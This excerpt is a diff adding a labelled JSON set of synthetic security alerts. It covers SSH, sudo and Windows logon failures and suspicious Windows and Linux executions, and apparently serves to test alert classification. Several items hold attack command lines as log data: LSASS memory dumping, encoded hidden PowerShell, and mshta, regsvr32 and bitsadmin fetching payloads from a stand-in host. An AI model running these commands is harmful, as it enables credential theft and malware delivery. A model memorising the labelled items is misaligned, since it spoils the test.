@@ -1,0 +1,1213 @@
+[
+  {
+    "id": "K150-001",
+    "texto": "Rule: 100101 (level 10) -> 'fuerza bruta por SSH desde 192.0.2.77' | Agent: srv-web-01 (192.0.2.10) | Location: /var/log/auth.log | data.srcip: 192.0.2.77 | data.srcport: 50000 | data.dstuser: root | full_log: Oct 15 10:00:11 srv-web-01 sshd[2000]: Failed password for root from 192.0.2.77 port 50000 ssh2",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100101",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-002",
+    "texto": "Rule: 100101 (level 10) -> 'fuerza bruta por SSH desde 192.0.2.88' | Agent: srv-app-03 (192.0.2.22) | Location: /var/log/auth.log | data.srcip: 192.0.2.88 | data.srcport: 50001 | data.dstuser: admin | full_log: Oct 15 10:01:11 srv-app-03 sshd[2001]: Failed password for admin from 192.0.2.88 port 50001 ssh2",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100101",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-003",
+    "texto": "Rule: 100101 (level 10) -> 'fuerza bruta por SSH desde 192.0.2.99' | Agent: srv-bd-02 (192.0.2.20) | Location: /var/log/auth.log | data.srcip: 192.0.2.99 | data.srcport: 50002 | data.dstuser: operador02 | full_log: Oct 15 10:02:11 srv-bd-02 sshd[2002]: Failed password for operador02 from 192.0.2.99 port 50002 ssh2",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100101",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-004",
+    "texto": "Rule: 100101 (level 10) -> 'fuerza bruta por SSH desde 192.0.2.150' | Agent: srv-fich-01 (192.0.2.12) | Location: /var/log/auth.log | data.srcip: 192.0.2.150 | data.srcport: 50003 | data.dstuser: deploy | full_log: Oct 15 10:03:11 srv-fich-01 sshd[2003]: Failed password for deploy from 192.0.2.150 port 50003 ssh2",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100101",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-005",
+    "texto": "Rule: 100101 (level 10) -> 'fuerza bruta por SSH desde 192.0.2.160' | Agent: srv-dc-01 (192.0.2.5) | Location: /var/log/auth.log | data.srcip: 192.0.2.160 | data.srcport: 50004 | data.dstuser: git | full_log: Oct 15 10:04:11 srv-dc-01 sshd[2004]: Failed password for git from 192.0.2.160 port 50004 ssh2",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100101",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-006",
+    "texto": "Rule: 100102 (level 10) -> 'fallos repetidos de autenticación local (PAM o sudo)' | Agent: srv-web-01 (192.0.2.10) | Location: /var/log/auth.log | data.srcuser: usuario01 | data.dstuser: root | data.tty: pts/0 | data.command: /usr/bin/apt | full_log: Oct 15 10:10:03 srv-web-01 sudo: usuario01 : 3 incorrect password attempts ; TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/apt",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100102",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-007",
+    "texto": "Rule: 100102 (level 10) -> 'fallos repetidos de autenticación local (PAM o sudo)' | Agent: srv-app-03 (192.0.2.22) | Location: /var/log/auth.log | data.srcuser: usuario02 | data.dstuser: root | data.tty: pts/1 | data.command: /usr/bin/apt | full_log: Oct 15 10:11:03 srv-app-03 sudo: usuario02 : 3 incorrect password attempts ; TTY=pts/1 ; USER=root ; COMMAND=/usr/bin/apt",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100102",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-008",
+    "texto": "Rule: 100102 (level 10) -> 'fallos repetidos de autenticación local (PAM o sudo)' | Agent: srv-bd-02 (192.0.2.20) | Location: /var/log/auth.log | data.srcuser: usuario03 | data.dstuser: root | data.tty: pts/2 | data.command: /usr/bin/apt | full_log: Oct 15 10:12:03 srv-bd-02 sudo: usuario03 : 3 incorrect password attempts ; TTY=pts/2 ; USER=root ; COMMAND=/usr/bin/apt",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100102",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-009",
+    "texto": "Rule: 100102 (level 10) -> 'fallos repetidos de autenticación local (PAM o sudo)' | Agent: srv-fich-01 (192.0.2.12) | Location: /var/log/auth.log | data.srcuser: usuario04 | data.dstuser: root | data.tty: pts/3 | data.command: /usr/bin/apt | full_log: Oct 15 10:13:03 srv-fich-01 sudo: usuario04 : 3 incorrect password attempts ; TTY=pts/3 ; USER=root ; COMMAND=/usr/bin/apt",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100102",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-010",
+    "texto": "Rule: 100103 (level 10) -> 'fallos repetidos de inicio de sesión en Windows o cuenta bloqueada' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | data.win.system.eventID: 4625 | data.win.system.channel: Security | data.win.eventdata.targetUserName: usuario01 | data.win.eventdata.ipAddress: 192.0.2.77 | data.win.eventdata.logonType: 3 | data.win.eventdata.status: 0xc000006d | data.win.eventdata.subStatus: 0xc000006a | data.win.eventdata.workstationName: EXTERNO-00",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100103",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-011",
+    "texto": "Rule: 100103 (level 10) -> 'fallos repetidos de inicio de sesión en Windows o cuenta bloqueada' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | data.win.system.eventID: 4625 | data.win.system.channel: Security | data.win.eventdata.targetUserName: usuario02 | data.win.eventdata.ipAddress: 192.0.2.88 | data.win.eventdata.logonType: 3 | data.win.eventdata.status: 0xc000006d | data.win.eventdata.subStatus: 0xc000006a | data.win.eventdata.workstationName: EXTERNO-01",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100103",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-012",
+    "texto": "Rule: 100103 (level 10) -> 'fallos repetidos de inicio de sesión en Windows o cuenta bloqueada' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | data.win.system.eventID: 4625 | data.win.system.channel: Security | data.win.eventdata.targetUserName: usuario03 | data.win.eventdata.ipAddress: 192.0.2.99 | data.win.eventdata.logonType: 3 | data.win.eventdata.status: 0xc000006d | data.win.eventdata.subStatus: 0xc000006a | data.win.eventdata.workstationName: EXTERNO-02",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100103",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-013",
+    "texto": "Rule: 100103 (level 10) -> 'fallos repetidos de inicio de sesión en Windows o cuenta bloqueada' | Agent: pc-ventas-14 (192.0.2.48) | Location: EventChannel | data.win.system.eventID: 4625 | data.win.system.channel: Security | data.win.eventdata.targetUserName: usuario04 | data.win.eventdata.ipAddress: 192.0.2.150 | data.win.eventdata.logonType: 3 | data.win.eventdata.status: 0xc000006d | data.win.eventdata.subStatus: 0xc000006a | data.win.eventdata.workstationName: EXTERNO-03",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100103",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-014",
+    "texto": "Rule: 100103 (level 10) -> 'fallos repetidos de inicio de sesión en Windows o cuenta bloqueada' | Agent: pc-rrhh-02 (192.0.2.33) | Location: EventChannel | data.win.system.eventID: 4625 | data.win.system.channel: Security | data.win.eventdata.targetUserName: usuario05 | data.win.eventdata.ipAddress: 192.0.2.160 | data.win.eventdata.logonType: 3 | data.win.eventdata.status: 0xc000006d | data.win.eventdata.subStatus: 0xc000006a | data.win.eventdata.workstationName: EXTERNO-04",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100103",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-015",
+    "texto": "Rule: 100103 (level 10) -> 'fallos repetidos de inicio de sesión en Windows o cuenta bloqueada' | Agent: srv-web-01 (192.0.2.10) | Location: EventChannel | data.win.system.eventID: 4625 | data.win.system.channel: Security | data.win.eventdata.targetUserName: usuario01 | data.win.eventdata.ipAddress: 192.0.2.170 | data.win.eventdata.logonType: 3 | data.win.eventdata.status: 0xc0000064",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100103",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-016",
+    "texto": "Rule: 100103 (level 10) -> 'fallos repetidos de inicio de sesión en Windows o cuenta bloqueada' | Agent: srv-app-03 (192.0.2.22) | Location: EventChannel | data.win.system.eventID: 4625 | data.win.system.channel: Security | data.win.eventdata.targetUserName: usuario02 | data.win.eventdata.ipAddress: 192.0.2.200 | data.win.eventdata.logonType: 3 | data.win.eventdata.status: 0xc0000064",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100103",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-017",
+    "texto": "Rule: 100103 (level 10) -> 'fallos repetidos de inicio de sesión en Windows o cuenta bloqueada' | Agent: srv-bd-02 (192.0.2.20) | Location: EventChannel | data.win.system.eventID: 4625 | data.win.system.channel: Security | data.win.eventdata.targetUserName: usuario03 | data.win.eventdata.ipAddress: 192.0.2.210 | data.win.eventdata.logonType: 3 | data.win.eventdata.status: 0xc0000064",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100103",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-018",
+    "texto": "Rule: 100102 (level 10) -> 'fallos repetidos de autenticación local (PAM o sudo)' | Agent: srv-bd-02 (192.0.2.20) | Location: /var/log/auth.log | data.srcuser: usuario01 | data.dstuser: root | full_log: Oct 15 10:20:40 srv-bd-02 su: FAILED su for root by usuario01",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100102",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-019",
+    "texto": "Rule: 100102 (level 10) -> 'fallos repetidos de autenticación local (PAM o sudo)' | Agent: srv-fich-01 (192.0.2.12) | Location: /var/log/auth.log | data.srcuser: usuario02 | data.dstuser: root | full_log: Oct 15 10:21:40 srv-fich-01 su: FAILED su for root by usuario02",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100102",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-020",
+    "texto": "Rule: 100102 (level 10) -> 'fallos repetidos de autenticación local (PAM o sudo)' | Agent: srv-dc-01 (192.0.2.5) | Location: /var/log/auth.log | data.srcuser: usuario03 | data.dstuser: root | full_log: Oct 15 10:22:40 srv-dc-01 su: FAILED su for root by usuario03",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100102",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-021",
+    "texto": "Rule: 100102 (level 10) -> 'fallos repetidos de autenticación local (PAM o sudo)' | Agent: srv-vpn-01 (192.0.2.4) | Location: /var/log/auth.log | data.srcuser: usuario04 | data.dstuser: root | full_log: Oct 15 10:23:40 srv-vpn-01 su: FAILED su for root by usuario04",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100102",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-022",
+    "texto": "Rule: 100103 (level 12) -> 'fallos repetidos de inicio de sesión en Windows o cuenta bloqueada' | Agent: srv-web-01 (192.0.2.10) | Location: EventChannel | data.win.system.eventID: 4625 | data.win.system.channel: Security | data.win.eventdata.targetUserName: usuario.prueba | data.win.eventdata.ipAddress: 192.0.2.77 | data.win.eventdata.logonType: 10 | data.win.eventdata.status: 0xc000006a",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100103",
+    "playbook_esperado": "",
+    "frontera": "F1/F3"
+  },
+  {
+    "id": "K150-023",
+    "texto": "Rule: 100103 (level 12) -> 'fallos repetidos de inicio de sesión en Windows o cuenta bloqueada' | Agent: srv-app-03 (192.0.2.22) | Location: EventChannel | data.win.system.eventID: 4625 | data.win.system.channel: Security | data.win.eventdata.targetUserName: usuario.prueba | data.win.eventdata.ipAddress: 192.0.2.88 | data.win.eventdata.logonType: 10 | data.win.eventdata.status: 0xc000006a",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100103",
+    "playbook_esperado": "",
+    "frontera": "F1/F3"
+  },
+  {
+    "id": "K150-024",
+    "texto": "Rule: 100102 (level 10) -> 'fallos repetidos de autenticación local (PAM o sudo)' | Agent: srv-vpn-01 (192.0.2.4) | Location: /var/log/vpn/auth.log | data.srcuser: usuario.prueba | data.srcip: 192.0.2.77 | full_log: Oct 15 10:30:00 srv-vpn-01 openvpn: AUTH_FAILED user=usuario.prueba from 192.0.2.77",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100102",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-025",
+    "texto": "Rule: 100102 (level 10) -> 'fallos repetidos de autenticación local (PAM o sudo)' | Agent: srv-vpn-01 (192.0.2.4) | Location: /var/log/vpn/auth.log | data.srcuser: usuario.prueba | data.srcip: 192.0.2.88 | full_log: Oct 15 10:31:00 srv-vpn-01 openvpn: AUTH_FAILED user=usuario.prueba from 192.0.2.88",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100102",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-026",
+    "texto": "Rule: 100102 (level 10) -> 'fallos repetidos de autenticación local (PAM o sudo)' | Agent: srv-vpn-01 (192.0.2.4) | Location: /var/log/vpn/auth.log | data.srcuser: usuario.prueba | data.srcip: 192.0.2.99 | full_log: Oct 15 10:32:00 srv-vpn-01 openvpn: AUTH_FAILED user=usuario.prueba from 192.0.2.99",
+    "familia_esperada": "F1",
+    "familia_candidata": "F1",
+    "regla": "100102",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-027",
+    "texto": "Rule: 100104 (level 12) -> 'PowerShell con comando codificado en Base64' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | data.win.eventdata.commandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A0AZQB3AC0A | data.win.eventdata.parentImage: C:\\Program Files\\Office\\root\\Office16\\WINWORD.EXE | data.win.eventdata.user: EJEMPLO\\usuario01",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100104",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-028",
+    "texto": "Rule: 100104 (level 12) -> 'PowerShell con comando codificado en Base64' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | data.win.eventdata.commandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A1AZQB3AC0A | data.win.eventdata.parentImage: C:\\Program Files\\Office\\root\\Office16\\EXCEL.EXE | data.win.eventdata.user: EJEMPLO\\usuario02",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100104",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-029",
+    "texto": "Rule: 100104 (level 12) -> 'PowerShell con comando codificado en Base64' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | data.win.eventdata.commandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A2AZQB3AC0A | data.win.eventdata.parentImage: C:\\Windows\\explorer.exe | data.win.eventdata.user: EJEMPLO\\usuario03",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100104",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-030",
+    "texto": "Rule: 100104 (level 12) -> 'PowerShell con comando codificado en Base64' | Agent: pc-ventas-14 (192.0.2.48) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | data.win.eventdata.commandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A3AZQB3AC0A | data.win.eventdata.parentImage: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.user: EJEMPLO\\usuario04",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100104",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-031",
+    "texto": "Rule: 100104 (level 12) -> 'PowerShell con comando codificado en Base64' | Agent: pc-rrhh-02 (192.0.2.33) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | data.win.eventdata.commandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A4AZQB3AC0A | data.win.eventdata.parentImage: C:\\Windows\\System32\\wscript.exe | data.win.eventdata.user: EJEMPLO\\usuario05",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100104",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-032",
+    "texto": "Rule: 100105 (level 12) -> 'ejecución sospechosa (Office lanza mshta, certutil decodifica o acceso a LSASS)' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\certutil.exe | data.win.eventdata.commandLine: certutil.exe -decode C:\\Users\\Public\\f.txt C:\\Users\\Public\\f.exe | data.win.eventdata.parentImage: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.user: EJEMPLO\\usuario01",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100105",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-033",
+    "texto": "Rule: 100105 (level 12) -> 'ejecución sospechosa (Office lanza mshta, certutil decodifica o acceso a LSASS)' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\mshta.exe | data.win.eventdata.commandLine: mshta.exe http://descargas.example/ver.hta | data.win.eventdata.parentImage: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.user: EJEMPLO\\usuario02",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100105",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-034",
+    "texto": "Rule: 100105 (level 12) -> 'ejecución sospechosa (Office lanza mshta, certutil decodifica o acceso a LSASS)' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\rundll32.exe | data.win.eventdata.commandLine: rundll32.exe C:\\Windows\\Temp\\a.dll,Start | data.win.eventdata.parentImage: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.user: EJEMPLO\\usuario03",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100105",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-035",
+    "texto": "Rule: 100105 (level 12) -> 'ejecución sospechosa (Office lanza mshta, certutil decodifica o acceso a LSASS)' | Agent: pc-ventas-14 (192.0.2.48) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\comsvcs.dll | data.win.eventdata.commandLine: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\lsass.dmp full | data.win.eventdata.parentImage: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.user: EJEMPLO\\usuario04",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100105",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-036",
+    "texto": "Rule: 100105 (level 12) -> 'ejecución sospechosa (Office lanza mshta, certutil decodifica o acceso a LSASS)' | Agent: pc-rrhh-02 (192.0.2.33) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\regsvr32.exe | data.win.eventdata.commandLine: regsvr32.exe /s /u /i:http://descargas.example/x.sct scrobj.dll | data.win.eventdata.parentImage: C:\\Windows\\System32\\cmd.exe | data.win.eventdata.user: EJEMPLO\\usuario05",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100105",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-037",
+    "texto": "Rule: 100106 (level 10) -> 'ejecutable o script en carpeta temporal o de usuario' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\usuario01\\AppData\\Local\\Temp\\factura_0.exe | data.win.eventdata.commandLine: \"C:\\Users\\usuario01\\AppData\\Local\\Temp\\factura_0.exe\" | data.win.eventdata.parentImage: C:\\Windows\\explorer.exe | data.win.eventdata.user: EJEMPLO\\usuario01",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100106",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-038",
+    "texto": "Rule: 100106 (level 10) -> 'ejecutable o script en carpeta temporal o de usuario' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\usuario02\\Downloads\\instalador.scr | data.win.eventdata.commandLine: \"C:\\Users\\usuario02\\Downloads\\instalador.scr\" | data.win.eventdata.parentImage: C:\\Windows\\explorer.exe | data.win.eventdata.user: EJEMPLO\\usuario02",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100106",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-039",
+    "texto": "Rule: 100106 (level 10) -> 'ejecutable o script en carpeta temporal o de usuario' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\Public\\upd.exe | data.win.eventdata.commandLine: \"C:\\Users\\Public\\upd.exe\" | data.win.eventdata.parentImage: C:\\Windows\\explorer.exe | data.win.eventdata.user: EJEMPLO\\usuario03",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100106",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-040",
+    "texto": "Rule: 100106 (level 10) -> 'ejecutable o script en carpeta temporal o de usuario' | Agent: pc-ventas-14 (192.0.2.48) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\Temp\\svch0st.exe | data.win.eventdata.commandLine: \"C:\\Windows\\Temp\\svch0st.exe\" | data.win.eventdata.parentImage: C:\\Windows\\explorer.exe | data.win.eventdata.user: EJEMPLO\\usuario04",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100106",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-041",
+    "texto": "Rule: 100106 (level 10) -> 'ejecutable o script en carpeta temporal o de usuario' | Agent: pc-rrhh-02 (192.0.2.33) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Users\\usuario05\\AppData\\Roaming\\run.exe | data.win.eventdata.commandLine: \"C:\\Users\\usuario05\\AppData\\Roaming\\run.exe\" | data.win.eventdata.parentImage: C:\\Windows\\explorer.exe | data.win.eventdata.user: EJEMPLO\\usuario05",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100106",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-042",
+    "texto": "Rule: 100106 (level 12) -> 'ejecutable o script en carpeta temporal o de usuario' | Agent: srv-web-01 (192.0.2.10) | Location: /var/log/audit/audit.log | data.audit.exe: /tmp/.x/kworkerd | data.audit.execve.a0: kworkerd | data.uid: 33 | full_log: type=EXECVE msg=audit: argc=1 a0=\"/tmp/.x/kworkerd\"",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100106",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-043",
+    "texto": "Rule: 100106 (level 12) -> 'ejecutable o script en carpeta temporal o de usuario' | Agent: srv-app-03 (192.0.2.22) | Location: /var/log/audit/audit.log | data.audit.exe: /tmp/.x/kworkerd | data.audit.execve.a0: kworkerd | data.uid: 33 | full_log: type=EXECVE msg=audit: argc=1 a0=\"/tmp/.x/kworkerd\"",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100106",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-044",
+    "texto": "Rule: 100106 (level 12) -> 'ejecutable o script en carpeta temporal o de usuario' | Agent: srv-bd-02 (192.0.2.20) | Location: /var/log/audit/audit.log | data.audit.exe: /tmp/.x/kworkerd | data.audit.execve.a0: kworkerd | data.uid: 33 | full_log: type=EXECVE msg=audit: argc=1 a0=\"/tmp/.x/kworkerd\"",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100106",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-045",
+    "texto": "Rule: 100106 (level 12) -> 'ejecutable o script en carpeta temporal o de usuario' | Agent: srv-web-01 (192.0.2.10) | Location: /var/log/audit/audit.log | data.audit.exe: /bin/sh | data.audit.execve.a0: sh | data.audit.execve.a1: -c | data.audit.execve.a2: id; uname -a | data.uid: 33 | full_log: type=EXECVE msg=audit: a0=\"sh\" a1=\"-c\" a2=\"id; uname -a\"",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100106",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-046",
+    "texto": "Rule: 100106 (level 12) -> 'ejecutable o script en carpeta temporal o de usuario' | Agent: srv-web-01 (192.0.2.10) | Location: /var/log/audit/audit.log | data.audit.exe: /bin/sh | data.audit.execve.a0: sh | data.audit.execve.a1: -c | data.audit.execve.a2: id; uname -a | data.uid: 33 | full_log: type=EXECVE msg=audit: a0=\"sh\" a1=\"-c\" a2=\"id; uname -a\"",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100106",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-047",
+    "texto": "Rule: 100106 (level 12) -> 'ejecutable o script en carpeta temporal o de usuario' | Agent: srv-web-01 (192.0.2.10) | Location: /var/log/audit/audit.log | data.audit.exe: /bin/sh | data.audit.execve.a0: sh | data.audit.execve.a1: -c | data.audit.execve.a2: id; uname -a | data.uid: 33 | full_log: type=EXECVE msg=audit: a0=\"sh\" a1=\"-c\" a2=\"id; uname -a\"",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100106",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-048",
+    "texto": "Rule: 100105 (level 12) -> 'ejecución sospechosa (Office lanza mshta, certutil decodifica o acceso a LSASS)' | Agent: pc-adm-07 (192.0.2.31) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\wmic.exe | data.win.eventdata.commandLine: wmic.exe process call create cmd.exe | data.win.eventdata.parentImage: C:\\Program Files\\Office\\root\\Office16\\WINWORD.EXE | data.win.eventdata.user: EJEMPLO\\usuario01",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100105",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-049",
+    "texto": "Rule: 100105 (level 12) -> 'ejecución sospechosa (Office lanza mshta, certutil decodifica o acceso a LSASS)' | Agent: pc-ventas-12 (192.0.2.47) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\bitsadmin.exe | data.win.eventdata.commandLine: bitsadmin /transfer j http://descargas.example/p.exe C:\\p.exe | data.win.eventdata.parentImage: C:\\Program Files\\Office\\root\\Office16\\WINWORD.EXE | data.win.eventdata.user: EJEMPLO\\usuario02",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100105",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-050",
+    "texto": "Rule: 100105 (level 12) -> 'ejecución sospechosa (Office lanza mshta, certutil decodifica o acceso a LSASS)' | Agent: pc-contab-03 (192.0.2.36) | Location: EventChannel | data.win.system.eventID: 1 | data.win.system.channel: Microsoft-Windows-Sysmon/Operational | data.win.eventdata.image: C:\\Windows\\System32\\wscript.exe | data.win.eventdata.commandLine: wscript.exe C:\\Users\\Public\\x.vbs | data.win.eventdata.parentImage: C:\\Program Files\\Office\\root\\Office16\\WINWORD.EXE | data.win.eventdata.user: EJEMPLO\\usuario03",
+    "familia_esperada": "F2",
+    "familia_candidata": "F2",
+    "regla": "100105",
+    "playbook_esperado": ""
+  },
+  {
+    "id": "K150-051",
